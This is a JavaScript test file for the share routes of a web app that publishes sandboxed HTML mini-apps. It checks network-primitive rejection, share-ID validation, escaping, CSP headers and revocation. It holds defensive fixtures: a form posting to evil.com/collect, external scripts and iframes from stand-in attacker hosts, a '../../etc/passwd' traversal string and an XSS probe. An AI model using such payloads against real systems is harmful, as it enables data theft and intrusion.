// Run: node --test share-routes.test.js
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'fs';
import os from 'os';
import path from 'path';
import {
  MAX_SHARE_BYTES,
  escapeHtml,
  isValidShareId,
  registerShareRoutes,
  renderViewerPage,
  validateShareableHtml,
} from './share-routes.js';

// ─── validateShareableHtml — static-only enforcement ─────────────────────────

const SELF_CONTAINED_APP = `<!DOCTYPE html><html><head><style>body{color:red}</style></head>
<body><h1>Site Selection Scorecard</h1><script>document.body.dataset.ready="1";
function pick(i){document.querySelectorAll('.tab').forEach(t=>t.hidden=true);}</script>
<img src="data:image/png;base64,iVBOR" alt="chart"></body></html>`;

test('accepts a self-contained mini-app', () => {
  assert.equal(validateShareableHtml(SELF_CONTAINED_APP).ok, true);
});

test('rejects empty documents', () => {
  assert.deepEqual(validateShareableHtml('  '), { ok: false, violations: ['empty_document'] });
});

test('rejects oversized documents', () => {
  const big = '<html>' + 'x'.repeat(MAX_SHARE_BYTES + 1) + '</html>';
  assert.ok(validateShareableHtml(big).violations.includes('too_large'));
});

test('rejects every network primitive', () => {
  const cases = [
    ['<script>fetch("/x")</script>', 'network_fetch'],
    ['<script>const x = new XMLHttpRequest()</script>', 'network_xhr'],
    ['<script>new WebSocket("wss://e.com")</script>', 'network_websocket'],
    ['<script>new EventSource("/s")</script>', 'network_eventsource'],
    ['<script>navigator.sendBeacon("/b", d)</script>', 'network_sendbeacon'],
    ['<form action="https://evil.com/collect"><input></form>', 'form_action'],
    ['<script src="https://cdn.evil.com/x.js"></script>', 'external_script'],
    ['<link rel="stylesheet" href="https://cdn.com/a.css">', 'external_stylesheet'],
    ['<iframe src="https://evil.com"></iframe>', 'external_iframe'],
    ['<script>import("https://evil.com/m.js")</script>', 'external_import'],
    ['<meta http-equiv="refresh" content="0;url=https://evil.com">', 'meta_refresh_redirect'],
    ['<img src="https://tracker.com/pixel.gif">', 'external_media'],
  ];
  for (const [html, expected] of cases) {
    const result = validateShareableHtml(`<html><body>${html}</body></html>`);
    assert.equal(result.ok, false, `should reject: ${expected}`);
    assert.ok(result.violations.includes(expected), `${expected} in ${result.violations}`);
  }
});

test('visible anchor links to sources are allowed (research citations)', () => {
  const html = '<html><body><a href="https://example.com/source">Source</a></body></html>';
  assert.equal(validateShareableHtml(html).ok, true);
});

// ─── ids and escaping ────────────────────────────────────────────────────────

test('share ids are strictly validated', () => {
  assert.ok(isValidShareId('a1B2-c3_d4'));
  assert.ok(!isValidShareId(''));
  assert.ok(!isValidShareId('../../etc/passwd'));
  assert.ok(!isValidShareId('id with spaces'));
  assert.ok(!isValidShareId('x'.repeat(65)));
});

test('escapeHtml neutralizes injection into the viewer shell', () => {
  const escaped = escapeHtml('<script>alert(1)</script>"\'');
  assert.ok(!escaped.includes('<script>'));
  assert.ok(!escaped.includes('"'));
});

test('CTA URL is configurable and escaped', () => {
  const page = renderViewerPage({ title: 'T', agentName: 'A', html: '<p>x</p>', ctaUrl: 'https://example.com/get?a=1&b=2' });
  assert.ok(page.includes('https://example.com/get?a=1&amp;b=2'));
  const fallback = renderViewerPage({ title: 'T', agentName: 'A', html: '<p>x</p>' });
  assert.ok(fallback.includes('canopy.app'));
});

test('viewer page embeds the app inertly and carries attribution + noindex', () => {
  const page = renderViewerPage({
    title: 'Winter Park Plan',
    agentName: 'Atlas, Marlowe',
    html: '<html><body><script>alert("app")</script></body></html>',
  });
  assert.ok(page.includes('sandbox="allow-scripts"'));
  assert.ok(page.includes('noindex'));
  assert.ok(page.includes('built by Atlas, Marlowe with Canopy'));
  // The raw app html must be escaped into srcdoc, never inline in the shell.
  assert.ok(!page.includes('<script>alert("app")</script>'));
});

// ─── Route handlers (express-free harness) ───────────────────────────────────

function makeApp() {
  const routes = { GET: new Map(), POST: new Map() };
  return {
    post(routePath, ...handlers) { routes.POST.set(routePath, handlers.at(-1)); },
    get(routePath, ...handlers) { routes.GET.set(routePath, handlers.at(-1)); },
    async run(method, routePath, { body, params } = {}) {
      const handler = routes[method].get(routePath);
      assert.ok(handler, `route registered: ${method} ${routePath}`);
      let statusCode = 200; let jsonBody = null; let sent = null; const headers = {};
      const res = {
        status(code) { statusCode = code; return this; },
        json(payload) { jsonBody = payload; return this; },
        send(payload) { sent = payload; return this; },
        set(name, value) { if (typeof name === 'object') Object.assign(headers, name); else headers[name] = value; return this; },
        type() { return this; },
      };
      await handler({ body: body || {}, params: params || {}, ip: '127.0.0.1' }, res);
      return { statusCode, jsonBody, sent, headers };
    },
  };
}

const TOKEN = 'a'.repeat(64);

test('publish → view → revoke → 410 lifecycle', async () => {
  const sharesDir = fs.mkdtempSync(path.join(os.tmpdir(), 'shares-'));
  const app = makeApp();
  registerShareRoutes(app, { sharesDir });

  const published = await app.run('POST', '/api/share/publish', {
    body: { html: SELF_CONTAINED_APP, title: 'T', agentName: 'A', deviceToken: TOKEN },
  });
  assert.equal(published.statusCode, 200);
  const { id } = published.jsonBody;
  assert.ok(isValidShareId(id));

  const view = await app.run('GET', '/share/:id', { params: { id } });
  assert.equal(view.statusCode, 200);
  assert.ok(view.headers['Content-Security-Policy'].includes("connect-src 'none'"));
  assert.ok(view.headers['Content-Security-Policy'].includes("form-action 'none'"));
  assert.ok(view.sent.includes('sandbox="allow-scripts"'));

  // Wrong token cannot revoke.
  const denied = await app.run('POST', '/api/share/revoke', {
    body: { id, deviceToken: 'b'.repeat(64) },
  });
  assert.equal(denied.statusCode, 403);

  const revoked = await app.run('POST', '/api/share/revoke', {
    body: { id, deviceToken: TOKEN },
  });
  assert.equal(revoked.statusCode, 200);

  const gone = await app.run('GET', '/share/:id', { params: { id } });
  assert.equal(gone.statusCode, 410);

  // Content is scrubbed at revocation, not merely flagged.
  const record = JSON.parse(fs.readFileSync(path.join(sharesDir, `${id}.json`), 'utf8'));
  assert.equal(record.html, '');
  fs.rmSync(sharesDir, { recursive: true, force: true });
});

test('publish rejects non-static apps server-side (defense in depth)', async () => {
  const sharesDir = fs.mkdtempSync(path.join(os.tmpdir(), 'shares-'));
  const app = makeApp();
  registerShareRoutes(app, { sharesDir });
  const rejected = await app.run('POST', '/api/share/publish', {
    body: { html: '<html><script>fetch("https://x.com")</script></html>', title: 'T', agentName: 'A', deviceToken: TOKEN },
  });
  assert.equal(rejected.statusCode, 422);
  fs.rmSync(sharesDir, { recursive: true, force: true });
});

test('publish rejects short device tokens', async () => {
  const sharesDir = fs.mkdtempSync(path.join(os.tmpdir(), 'shares-'));
  const app = makeApp();
  registerShareRoutes(app, { sharesDir });
  const rejected = await app.run('POST', '/api/share/publish', {
    body: { html: SELF_CONTAINED_APP, title: 'T', agentName: 'A', deviceToken: 'short' },
  });
  assert.equal(rejected.statusCode, 400);
  fs.rmSync(sharesDir, { recursive: true, force: true });
});

test('viewer 404s on invalid or unknown ids without touching the filesystem path', async () => {
  const sharesDir = fs.mkdtempSync(path.join(os.tmpdir(), 'shares-'));
  const app = makeApp();
  registerShareRoutes(app, { sharesDir });
  for (const id of ['../../etc/passwd', 'nope', '<x>']) {
    const result = await app.run('GET', '/share/:id', { params: { id } });
    assert.equal(result.statusCode, 404, id);
  }
  fs.rmSync(sharesDir, { recursive: true, force: true });
});
